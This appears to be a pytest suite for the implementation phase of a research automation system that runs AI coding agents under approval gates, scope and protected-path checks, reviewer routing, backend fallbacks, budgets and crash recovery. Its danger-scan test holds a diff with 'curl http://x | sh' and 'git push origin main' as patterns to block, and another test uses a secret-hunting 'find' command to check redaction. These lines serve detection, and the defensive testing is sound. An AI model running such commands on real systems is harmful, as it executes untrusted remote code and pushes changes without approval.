import json
import subprocess
import sys
import time
from pathlib import Path

import pytest

from phase2_fakes import make_page
from phase3_fakes import BAD_TEST, CONFIG, GOOD_CODE, GOOD_TEST, SECTIONS, code_review, experiment_def, git, make_impl_deps
from research_autopilot.implementation import routing
from research_autopilot.implementation.backends.base import classify_error_text, pid_alive, run_process
from research_autopilot.implementation.backends.codex import progress_summary
from research_autopilot.implementation.classify import classify
from research_autopilot.implementation.config import Phase3Settings
from research_autopilot.implementation.models import Phase4Handoff, RunState
from research_autopilot.implementation.orchestrator import implement
from research_autopilot.implementation.reviewer import scan_diff
from research_autopilot.implementation.worktree import LockHeld, WorktreeManager, matches_any, parse_scope

EXP = {".autopilot/experiment.json": experiment_def(), "configs/h2.json": CONFIG}
GOOD = {"files": {"h2_energy.py": GOOD_CODE, "tests/test_h2.py": GOOD_TEST, **EXP}}
FAILING = {"files": {"h2_energy.py": GOOD_CODE, "tests/test_h2.py": BAD_TEST, **EXP}}


def codes(m):
    return [b.code for b in m.block_reasons]


def test_phase3_prompts_keep_implementation_and_experiment_roles_separate():
    from research_autopilot.implementation.prompts import IMPLEMENTER_RULES, REVIEWER_RULES

    assert "Real research outputs are" in IMPLEMENTER_RULES and "validated by Phase 4" in IMPLEMENTER_RULES
    assert "implementation review before Phase 4" in REVIEWER_RULES
    assert "Do not require real result JSON/CSV" in REVIEWER_RULES
    assert "bounded technical implementation work" in REVIEWER_RULES


def test_prompts_describe_how_phase4_actually_builds_the_environment():
    import inspect

    from research_autopilot.experiments import environment
    from research_autopilot.implementation.prompts import IMPLEMENTER_RULES, REVIEWER_RULES

    install = inspect.getsource(environment._install)
    assert "install_argv" not in install  # Phase 4 never runs the declared install command ...
    for rules in (IMPLEMENTER_RULES, REVIEWER_RULES):  # ... so neither role may build a contract on it
        assert "install_argv is not executed" in rules.lower()
        assert "uv pip freeze" in rules and "uv sync --frozen" in rules
    assert "Do not require a lock file" in REVIEWER_RULES


def test_process_output_is_persisted_incrementally_and_reported(tmp_path):
    progress = []
    log = tmp_path / "backend.log"
    outcome = run_process(
        [sys.executable, "-c", "print('first', flush=True); print('second', flush=True)"],
        tmp_path, "", 30, log, lambda pid: None, on_stdout=progress.append,
    )
    assert outcome.exit_code == 0
    assert progress == ["first\n", "second\n"]
    assert "--- stdout ---\nfirst\nsecond\n" in log.read_text()


def test_codex_progress_summary_never_forwards_raw_commands_or_agent_text():
    raw = json.dumps({"type": "item.started", "item": {"type": "command_execution",
                     "command": "find /Users/alice -name '*SECRET*' -print"}})
    summary = progress_summary(raw)
    assert summary == "repository inspection started"
    assert "alice" not in summary and "SECRET" not in summary
    assert progress_summary(json.dumps({"type": "item.completed", "item": {
        "type": "agent_message", "text": "private chain of thought"}})) is None


def test_only_implementation_and_review_milestones_are_sent_to_logs(tmp_path):
    class Recorder:
        persistent = True

        def __init__(self):
            self.events = []

        def send(self, event):
            self.events.append(event)

    deps, _, rec, _, _ = make_impl_deps(
        tmp_path, [{**GOOD, "progress": ["repository inspection started", "tests completed, exit 0"]}]
    )
    recorder = Recorder()
    deps.notifier = recorder
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    details = [event.details[0] for event in recorder.events]
    assert m.state is RunState.COMPLETED
    # milestones only: implementation started -> finished -> review started -> finished (user request 2026-10-14)
    assert [d.split(" (")[0] for d in details] == ["implementer attempt 1 started", "implementer attempt 1 finished with completed",
                                                  "review for attempt 1 started", "review for attempt 1 finished with pass"]
    assert all(event.kind.value == "phase_transition" for event in recorder.events)
    # the coding agent's step-by-step messages stay in the manifest for later inspection
    assert any("repository inspection started" in e.message for e in m.events)


# ---------------------------------------------------------------- classification / routing


@pytest.mark.parametrize("kw,impl", [
    (dict(specification="Write a small helper that formats a table of results as CSV output.", n_steps=2,
          scope_globs=["fmt.py"]), "low"),
    (dict(specification="Build the data pipeline integration with the database layer for results.", n_steps=5,
          scope_globs=["pipe.py", "db.py"]), "medium"),
    (dict(specification="Implement a novel parallel search algorithm over orbital subsets with GPU kernels.",
          n_steps=9, scope_globs=["src/**", "tests/**"]), "high"),
])
def test_complexity_levels_route_to_tiers(kw, impl):
    a = classify(plan_text="", invariants=None, acceptance=None, **kw)
    assert a.implementation_complexity == impl
    s = Phase3Settings()
    choice = routing.implementer_choice(s, a)
    assert choice.tier == routing.COMPLEXITY_TIER[impl]
    assert choice.model == s.models["codex"][choice.tier]


def test_scientific_risk_drives_reviewer_independently():
    low_impl_high_risk = classify(specification="Change the NEVPT2 energy evaluation metric sign convention here.",
                                  plan_text="", invariants=None, acceptance=None, scope_globs=["metric.py"], n_steps=1)
    assert low_impl_high_risk.implementation_complexity == "low"
    assert low_impl_high_risk.scientific_risk == "high"
    s = Phase3Settings()
    assert routing.implementer_choice(s, low_impl_high_risk).tier == "lightweight"
    assert routing.reviewer_choice(s, low_impl_high_risk).tier == "high_reasoning"
    plain = classify(specification="Write a small helper that formats a table of results as CSV output.",
                     plan_text="", invariants=None, acceptance=None, scope_globs=["fmt.py"], n_steps=1)
    assert plain.scientific_risk == "low" and routing.reviewer_choice(s, plain).tier == "standard"


def test_unclassifiable_task_is_conservative():
    a = classify(specification=None, plan_text="", invariants=None, acceptance=None, scope_globs=[], n_steps=0)
    assert a.implementation_complexity == "medium" and a.scientific_risk == "medium"
    assert any("conservative" in r for r in a.classification_reason)


def test_models_configurable_from_env():
    from research_autopilot.implementation.config import load_phase3_settings
    s = load_phase3_settings({"RA_CODEX_MODEL_LIGHT": "gpt-x-mini", "RA_IMPL_MAX_REVISIONS": "1"})
    assert s.models["codex"]["lightweight"] == "gpt-x-mini" and s.max_revisions == 1


# ---------------------------------------------------------------- happy path / git safety


def test_implements_commits_on_task_branch_and_leaves_main_untouched(tmp_path):
    deps, repo, rec, _, _ = make_impl_deps(tmp_path, [GOOD])
    main_before = git(repo, "rev-parse", "main")
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert m.state is RunState.COMPLETED, m.block_reasons
    assert git(repo, "rev-parse", "main") == main_before
    assert git(repo, "rev-parse", "--abbrev-ref", "HEAD") == "main"
    assert m.task.branch.startswith("autopilot/inu-900-")
    assert git(repo, "rev-parse", m.task.branch) == m.implementation_commit
    assert sorted(m.changed_files) == [".autopilot/experiment.json", "configs/h2.json", "h2_energy.py", "tests/test_h2.py"]
    assert not any(e.args[:1] == ["push"] or e.args[:1] == ["merge"] for e in m.git_audit)
    assert all(e.exit_code == 0 or e.args[0] == "rev-parse" for e in m.git_audit)
    # Phase 4 handoff
    h = Phase4Handoff.model_validate_json(Path(m.artifact_paths["phase4_handoff"]).read_text())
    assert h.implementation_commit == m.implementation_commit and h.reviewer_verdict == "pass"
    assert h.unverified_items == ["energy value not checked against reference"]
    assert any(c.name == "tests" and c.ok for c in h.checks)
    # manifest persisted and consistent
    stored = deps.store.get_implementation(m.phase3_run_id)
    assert stored.implementation_commit == m.implementation_commit and stored.state is RunState.COMPLETED
    assert json.loads(Path(m.artifact_paths["manifest"]).read_text())["phase3_run_id"] == m.phase3_run_id
    assert stored.usage.input_tokens == 1000 + 500 and stored.cost_unknown_calls == 2
    assert stored.assessment.scientific_risk in ("medium", "high")
    # Linear not touched by Phase 3 (never Done)
    assert deps.manager.linear.writes == [("uuid-INU-900", "In Progress")]  # only Phase 2's write


def test_uncommitted_work_in_main_checkout_is_preserved(tmp_path):
    deps, repo, rec, _, _ = make_impl_deps(tmp_path, [GOOD])
    (repo / "README.md").write_text("local edit in progress\n")
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert m.state is RunState.COMPLETED
    assert (repo / "README.md").read_text() == "local edit in progress\n"
    assert any("uncommitted" in e.message for e in m.events)


# ---------------------------------------------------------------- approval gate


def test_dry_run_handoff_is_not_approved(tmp_path):
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [GOOD], mode="dry_run")
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert m.state is RunState.BLOCKED and codes(m) == ["not_approved"]
    assert deps.backends["codex"].calls == []


def test_linear_not_in_progress_blocks(tmp_path):
    deps, _, rec, _, linear = make_impl_deps(tmp_path, [GOOD])
    linear.issues["INU-900"].state_name = "Todo"
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert codes(m) == ["not_approved"] and deps.backends["codex"].calls == []


def test_spec_changed_since_planning_blocks(tmp_path):
    deps, _, rec, notion, _ = make_impl_deps(tmp_path, [GOOD])
    page = next(iter(notion.pages.values()))
    notion.pages[page.page_id] = make_page(sections={**SECTIONS, "acceptance_criteria": "changed"})
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert codes(m) == ["spec_changed"]


def test_old_handoff_without_mode_is_blocked(tmp_path):
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [GOOD])
    data = json.loads(Path(rec.handoff_path).read_text())
    for k in ("phase2_mode", "repository", "file_scope", "non_goals", "input_artifacts", "specification"):
        data.pop(k)
    old = tmp_path / "old.json"
    old.write_text(json.dumps(data))
    m = implement(deps, handoff_path=old)
    assert codes(m) == ["not_approved"]


@pytest.mark.parametrize("override,code", [
    ({"repository": "unknown-repo"}, "repository_invalid"),
    ({"file_scope": None}, "scope_missing"),
])
def test_repository_and_scope_required(tmp_path, override, code):
    sections = {k: v for k, v in {**SECTIONS, **override}.items() if v is not None}
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [GOOD], sections=sections)
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert codes(m) == [code]


# ---------------------------------------------------------------- review / revisions


def test_failing_tests_are_sent_back_and_fixed(tmp_path):
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [FAILING, GOOD])
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert m.state is RunState.COMPLETED
    assert [a.review.verdict for a in m.attempts] == ["revise", "pass"]
    assert m.attempts[0].review.categories == ["tests"]
    assert m.attempts[0].review.llm is None  # LLM not consulted while tests fail
    second_prompt = deps.backends["codex"].calls[1].prompt
    assert "failed" in second_prompt and "attempt 2" in second_prompt
    assert deps.backends["claude"].calls == []  # normal test failure never triggers fallback


def test_llm_pass_cannot_override_failing_tests(tmp_path):
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [FAILING] * 3, reviewer=[code_review("pass")] * 3)
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert m.state is RunState.BLOCKED and codes(m) == ["revision_limit"]
    assert deps.reviewers["codex"].calls == []


def test_max_two_revisions(tmp_path):
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [GOOD] * 3, reviewer=[code_review("revise")] * 3)
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert m.state is RunState.BLOCKED and codes(m) == ["revision_limit"]
    assert len(m.attempts) == 3 and m.revisions_used == 2
    assert len(deps.backends["codex"].calls) == 3


def test_escalation_after_repeated_same_failure_without_extra_attempts(tmp_path):
    from research_autopilot.implementation.classify import Rules
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [FAILING, FAILING, GOOD])
    deps.rules = Rules(steps_medium=99, steps_high=99, scope_globs_medium=99, scope_globs_high=99,
                       complexity_high_keywords=[], complexity_medium_keywords=[])  # start at the lightweight tier
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert m.state is RunState.COMPLETED
    tiers = [a.choice.tier for a in m.attempts]
    assert tiers[0] == "lightweight"
    assert tiers[0] == tiers[1] and routing.TIER_ORDER.index(tiers[2]) == routing.TIER_ORDER.index(tiers[1]) + 1
    assert m.attempts[2].escalation_reason and len(m.attempts) == 3


def test_invariant_violation_is_sent_back_but_never_escalated(tmp_path):
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [GOOD] * 3, reviewer=[code_review("revise", invariant=True)] * 3)
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert m.attempts[0].review.categories == ["invariant_violation"]
    assert len({a.choice.model for a in m.attempts}) == 1  # no escalation
    assert deps.backends["claude"].calls == []
    assert codes(m) == ["revision_limit"]


def test_reviewer_blocked_stops(tmp_path):
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [GOOD], reviewer=[code_review("blocked")])
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert codes(m) == ["review_blocked"]


def test_out_of_scope_change_is_unapproved_and_blocked(tmp_path):
    deps, repo, rec, _, _ = make_impl_deps(tmp_path, [{"files": {**GOOD["files"], "setup.py": "x = 1\n"}}])
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert codes(m) == ["unapproved_change"]
    assert m.final_review.deterministic.out_of_scope_files == ["setup.py"]
    assert len(deps.backends["codex"].calls) == 1  # no retry / escalation / fallback


def test_protected_path_change_is_blocked(tmp_path):
    sections = {**SECTIONS, "file_scope": "- h2_energy.py\n- tests/**\n- data/**"}
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [{"files": {**GOOD["files"], "data/validated.json": "{\"x\":1}\n"}}],
                                        sections=sections)
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert codes(m) == ["unapproved_change"]
    assert m.final_review.deterministic.protected_violations == ["data/validated.json"]


# ---------------------------------------------------------------- fallback


@pytest.mark.parametrize("status", ["quota_exhausted", "rate_limited", "process_error"])
def test_codex_to_claude_fallback_preserves_work(tmp_path, status):
    partial = {"status": status, "files": {"h2_energy.py": GOOD_CODE}, "error": "usage limit"}
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [partial], claude=[{"files": {"tests/test_h2.py": GOOD_TEST, **EXP}}])
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert m.state is RunState.COMPLETED, m.block_reasons
    a = m.attempts[0]
    assert a.choice.backend == "claude" and a.fallback_reason.startswith(f"codex {status}")
    assert m.fallback_used and m.backend_invocations == 2
    # Claude resumed from Git state: Codex's file was still there and was handed over in the prompt
    claude_prompt = deps.backends["claude"].calls[0].prompt
    assert "h2_energy.py" in claude_prompt and "CURRENT STATE OF THE WORKTREE" in claude_prompt
    assert "h2_energy.py" in m.changed_files and "tests/test_h2.py" in m.changed_files
    assert any("before-fallback" in p.name for p in Path(m.artifact_paths["manifest"]).parent.iterdir())


def test_old_process_is_terminated_before_fallback(tmp_path):
    sleeper = subprocess.Popen(["sleep", "60"], start_new_session=True)
    try:
        partial = {"status": "quota_exhausted", "pid": sleeper.pid}
        deps, _, rec, _, _ = make_impl_deps(tmp_path, [partial], claude=[GOOD])
        m = implement(deps, handoff_path=Path(rec.handoff_path))
        assert m.state is RunState.COMPLETED
        time.sleep(0.2)
        assert sleeper.poll() is not None  # terminated before Claude started
    finally:
        if sleeper.poll() is None:
            sleeper.kill()


def test_transient_error_retries_same_backend_once(tmp_path):
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [{"status": "transient_error"}, GOOD])
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert m.state is RunState.COMPLETED and not m.fallback_used and m.backend_invocations == 2


def test_no_fallback_when_fallback_unavailable(tmp_path):
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [{"status": "rate_limited"}])
    deps.backends["claude"].authenticated = False
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert codes(m) == ["fallback_unavailable"]


def test_auth_error_does_not_fall_back(tmp_path):
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [{"status": "auth_error"}])
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert codes(m) == ["auth_error"] and deps.backends["claude"].calls == []


def test_no_fallback_left_after_every_configured_backend(tmp_path):
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [{"status": "quota_exhausted"}], claude=[{"status": "rate_limited"}])
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert codes(m) == ["fallback_unavailable"]


def test_subscription_limits_on_both_backends_fall_back_to_the_api_billed_codex(tmp_path):
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [{"status": "quota_exhausted", "files": {"h2_energy.py": GOOD_CODE}}],
                                        claude=[{"status": "quota_exhausted"}],
                                        codex_api=[{"files": {"tests/test_h2.py": GOOD_TEST, **EXP}, "cost": 0.4}])
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert m.state is RunState.COMPLETED, m.block_reasons
    assert m.fallbacks_used == ["claude", "codex_api"] and m.attempts[0].choice.backend == "codex_api"
    assert m.cost_usd_known >= 0.4  # API-billed calls are accounted against the cost limits
    assert "CURRENT STATE OF THE WORKTREE" in deps.backends["codex_api"].calls[0].prompt


def test_an_unusable_fallback_is_skipped_and_the_fallback_limit_holds(tmp_path):
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [{"status": "quota_exhausted"}], codex_api=[GOOD])
    deps.backends["claude"].authenticated = False
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert m.state is RunState.COMPLETED and m.fallbacks_used == ["codex_api"]
    deps, _, rec, _, _ = make_impl_deps(tmp_path / "limit", [{"status": "quota_exhausted"}],
                                        claude=[{"status": "quota_exhausted"}], codex_api=[GOOD], max_fallbacks=1)
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert codes(m) == ["fallback_unavailable"] and deps.backends["codex_api"].calls == []


def test_reviewer_falls_back_through_every_backend(tmp_path):
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [GOOD], reviewer=["quota_exhausted"],
                                        claude_reviewer=["quota_exhausted"], codex_api=[])
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert m.state is RunState.COMPLETED and m.final_review.reviewer.backend == "codex_api"


def test_an_api_reviewers_cost_counts_after_a_subscription_reviewer_fails(tmp_path):
    """Eagle 2026-10-15: the unknown cost of a failed subscription reviewer hid the fallback API reviewer's cost."""
    from phase3_fakes import FakeReviewer
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [GOOD], reviewer=["quota_exhausted"],
                                        claude_reviewer=["quota_exhausted"], codex_api=[])
    deps.reviewers["codex_api"] = FakeReviewer("codex_api", [], cost_usd=0.25)
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert m.final_review.reviewer_cost_usd == 0.25 and m.final_review.reviewer_cost_unknown_calls == 2
    assert m.cost_usd_known == 0.25  # the subscription implementer and reviewers have no known cost
    assert m.cost_unknown_calls == 1 + 2


def test_api_billed_codex_backend_isolates_its_login_and_prices_every_call(tmp_path, monkeypatch):
    from research_autopilot.config import ModelPrice
    from research_autopilot.implementation.backends.base import BackendRequest
    from research_autopilot.implementation.backends.codex import CodexApiBackend
    from research_autopilot.implementation.models import ImplementationTask, ModelChoice

    fake = tmp_path / "codex"
    fake.write_text("#!/bin/sh\ncat >/dev/null\n"
                    '[ -n "$CODEX_API_KEY" ] && [ -z "$OPENAI_API_KEY" ] && [ "$CODEX_HOME" = "' + str(tmp_path / "home")
                    + '" ] || exit 3\n'
                    'echo \'{"type":"item.completed","item":{"type":"agent_message","text":"ok"}}\'\n'
                    'echo \'{"type":"turn.completed","usage":{"input_tokens":1000000,"cached_input_tokens":0,'
                    '"output_tokens":100000}}\'\n')
    fake.chmod(0o755)
    monkeypatch.setenv("OPENAI_API_KEY", "sk-test-not-forwarded")
    backend = CodexApiBackend("sk-test", {"gpt-priced": ModelPrice(input_per_1m=1.0, output_per_1m=10.0)},
                              tmp_path / "home", executable=str(fake))
    assert backend.status().authenticated and backend.status().billing == "api"
    task = ImplementationTask.model_construct(worktree_path=str(tmp_path))
    req = lambda model: BackendRequest(task=task, choice=ModelChoice(backend="codex_api", tier="high_reasoning",
                                                                     model=model), prompt="p", timeout_seconds=30,
                                       log_path=tmp_path / f"{model}.log")
    r = backend.run(req("gpt-priced"), lambda pid: None)
    assert r.status == "completed" and r.backend == "codex_api" and r.cost_usd == 2.0
    refused = backend.run(req("gpt-unpriced"), lambda pid: None)
    assert refused.status == "process_error" and "RA_MODEL_PRICING" in refused.error
    assert not (tmp_path / "gpt-unpriced.log").exists()  # never launched
    assert not CodexApiBackend(None, {}, tmp_path / "home", executable=str(fake)).status().authenticated


# ---------------------------------------------------------------- budget / time


def test_token_budget_exceeded_stops_without_escalation_or_fallback(tmp_path):
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [{**FAILING, "tokens": 5000}, GOOD], max_tokens_per_run=4000)
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert codes(m) == ["budget_exceeded"] and len(deps.backends["codex"].calls) == 1
    assert deps.backends["claude"].calls == []


def test_cost_budget_exceeded(tmp_path):
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [{"status": "quota_exhausted"}],
                                        claude=[{**FAILING, "cost": 3.0}, GOOD], max_cost_usd_per_run=2.0)
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert codes(m) == ["budget_exceeded"] and m.cost_usd_known == 3.0


def test_backend_budget_cap_stops(tmp_path):
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [{"status": "budget_exceeded"}])
    assert codes(implement(deps, handoff_path=Path(rec.handoff_path))) == ["budget_exceeded"]


# ---------------------------------------------------------------- concurrency / recovery


def test_concurrent_edit_of_same_worktree_is_prevented(tmp_path):
    deps, repo, rec, _, _ = make_impl_deps(tmp_path, [GOOD])
    wt = WorktreeManager(deps.registry["h2-test"], deps.settings.worktrees_dir)
    path = deps.settings.worktrees_dir / "x"
    lock = wt.acquire_lock(path, {"run_id": "a"})
    with pytest.raises(LockHeld):
        wt.acquire_lock(path, {"run_id": "b"})
    wt.release_lock(lock)
    assert wt.acquire_lock(path, {"run_id": "b"})


def test_stale_lock_from_dead_process_is_taken_over(tmp_path):
    deps, *_ = make_impl_deps(tmp_path, [GOOD])
    wt = WorktreeManager(deps.registry["h2-test"], deps.settings.worktrees_dir)
    dead = subprocess.Popen(["true"]); dead.wait()
    wt.acquire_lock(deps.settings.worktrees_dir / "y", {"run_id": "a", "pid": dead.pid})
    assert wt.acquire_lock(deps.settings.worktrees_dir / "y", {"run_id": "b"})


def test_second_run_for_same_task_is_blocked_by_lease(tmp_path):
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [GOOD])
    assert deps.store.acquire_lease("phase3:INU-900", "someone-else", 600)
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert codes(m) == ["concurrent_run"] and deps.backends["codex"].calls == []


def test_crash_mid_attempt_is_recovered_from_manifest(tmp_path):
    class Crash(BaseException):  # simulates the worker process dying mid-attempt
        pass

    deps, repo, rec, _, _ = make_impl_deps(tmp_path, [{**GOOD, "raise": Crash()}])
    with pytest.raises(Crash):
        implement(deps, handoff_path=Path(rec.handoff_path))
    run = deps.store.list_implementations("INU-900")[0]
    crashed = deps.store.get_implementation(run["phase3_run_id"])
    assert crashed.state is RunState.IMPLEMENTING  # interrupted, not success / failure
    assert crashed.attempts[0].result is None
    # simulate the lease expiring with the dead worker
    deps.store.release_lease("phase3:INU-900", crashed.phase3_run_id)
    deps.store.release_lease("phase3:__global__", crashed.phase3_run_id)

    resumed = implement(deps, resume_run_id=crashed.phase3_run_id)
    assert resumed.state is RunState.COMPLETED, resumed.block_reasons
    assert resumed.phase3_run_id == crashed.phase3_run_id
    assert resumed.recovery_state == "resumed_after_interrupt"
    assert resumed.attempts[0].recovered and resumed.attempts[0].commit is not None
    assert len(resumed.attempts) == 1  # the crashed attempt's work was reviewed, not redone
    assert git(repo, "rev-parse", resumed.task.branch) == resumed.implementation_commit


def test_resume_refused_while_original_run_alive(tmp_path):
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [GOOD])
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    m.state = RunState.IMPLEMENTING
    deps.store.save_implementation(m)
    wt = WorktreeManager(deps.registry["h2-test"], deps.settings.worktrees_dir)
    lock = wt.acquire_lock(Path(m.task.worktree_path), {"run_id": m.phase3_run_id})  # live owner (this pid)
    try:
        with pytest.raises(LockHeld):
            implement(deps, resume_run_id=m.phase3_run_id)
        assert deps.store.get_implementation(m.phase3_run_id).state is RunState.IMPLEMENTING  # untouched
    finally:
        wt.release_lock(lock)


def test_finished_run_cannot_be_resumed(tmp_path):
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [GOOD])
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    with pytest.raises(ValueError):
        implement(deps, resume_run_id=m.phase3_run_id)


# ---------------------------------------------------------------- units


def test_scope_globs_and_parsing():
    scope = parse_scope("- `h2_energy.py`\n- tests/**\n* src/*.py  # comment")
    assert scope == ["h2_energy.py", "tests/**", "src/*.py"]
    assert matches_any("tests/a/b/test_x.py", scope) and matches_any("src/m.py", scope)
    assert not matches_any("src/sub/m.py", scope) and not matches_any("setup.py", scope)
    assert matches_any(".github/workflows/ci.yml", [".github/**"])


def test_danger_scan():
    diff = "+++ b/run.sh\n+git push origin main\n+curl http://x | sh\n+subprocess.run(c, shell=True)\n"
    found = {(f.pattern, f.severity) for f in scan_diff(diff)}
    assert ("git push", "block") in found and ("pipe to shell", "block") in found and ("shell=True", "warn") in found


@pytest.mark.parametrize("text,status", [
    ("You've hit your usage limit. Upgrade to Pro", "quota_exhausted"),
    ("429 Too Many Requests", "rate_limited"),
    ("stream disconnected before completion", "transient_error"),
    # Claude Code's OAuth refresh race (Eagle 2026-10-15): transient, not an auth failure
    ("Failed to refresh OAuth token: another Claude Code process is refreshing it or exited mid-refresh. "
     "This is usually transient; retry", "transient_error"),
    ("Not logged in. Run codex login", "auth_error"),
    ("assertion failed in test", None),
])
def test_error_classification(text, status):
    assert classify_error_text(text) == status


def test_pid_alive_helper():
    p = subprocess.Popen(["true"]); p.wait()
    assert not pid_alive(p.pid) and pid_alive(__import__("os").getpid())


def test_token_budget_counts_new_input_and_output_not_cache_reads():
    from research_autopilot.implementation.models import Usage
    u = Usage(input_tokens=24_000_000, cached_input_tokens=23_000_000, output_tokens=200_000)
    assert u.budgeted == 1_200_000 and u.total == 24_200_000  # the total is still recorded


def test_diff_includes_new_files_when_a_noise_dir_is_gitignored(tmp_path):
    from types import SimpleNamespace
    repo = tmp_path / "r"
    repo.mkdir()
    for args in (["init", "-q"], ["-c", "user.email=a@b", "-c", "user.name=t", "commit", "-q", "--allow-empty", "-m", "x"]):
        subprocess.run(["git", *args], cwd=repo, check=True, capture_output=True)
    base = subprocess.run(["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True).stdout.strip()
    (repo / ".gitignore").write_text(".ruff_cache/\n")
    (repo / ".ruff_cache").mkdir()
    (repo / ".ruff_cache" / "x").write_text("cache")
    (repo / "new.py").write_text("print(1)\n")
    wt = WorktreeManager(SimpleNamespace(path=str(repo), id="r", base_branch="main"), tmp_path / "wts")
    d = wt.diff(repo, base)
    assert "b/new.py" in d and "b/.ruff_cache" not in d


def test_a_transient_reviewer_error_retries_the_same_reviewer(tmp_path):
    """Eagle 2026-10-15: one transient Claude failure skipped to an exhausted fallback and blocked the review."""
    from phase3_fakes import FakeReviewer, code_review
    deps, _, rec, _, _ = make_impl_deps(tmp_path, [GOOD])
    deps.reviewers["codex"] = FakeReviewer("codex", ["transient_error", code_review("pass")])
    deps.reviewers["claude"] = FakeReviewer("claude", [])  # must not be needed
    m = implement(deps, handoff_path=Path(rec.handoff_path))
    assert m.state is RunState.COMPLETED
    assert any("transient error; retrying" in e.message for e in m.events)
